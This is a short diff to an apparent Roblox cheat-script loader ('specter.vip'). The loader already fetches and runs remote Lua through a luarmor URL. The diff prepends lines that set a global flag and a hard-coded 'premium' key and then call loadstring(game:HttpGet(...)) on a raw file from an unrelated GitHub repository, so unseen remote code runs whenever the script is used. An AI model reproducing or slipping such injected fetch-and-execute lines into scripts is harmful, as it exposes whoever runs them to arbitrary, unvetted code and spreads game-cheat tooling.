@@ -1,3 +1,7 @@
+_G.InjectedGui = true
+getgenv().Key = "PremUmKey123"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kompotas/ActualLirp/refs/heads/main/Random2", true))()
+
 script_key="NHxqzRtyKfuKkVQAXbNddwucLsleKQbe";
 -- specter.vip \\ #1 script
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6a93661d8267f268797c401f172e5823.lua"))()
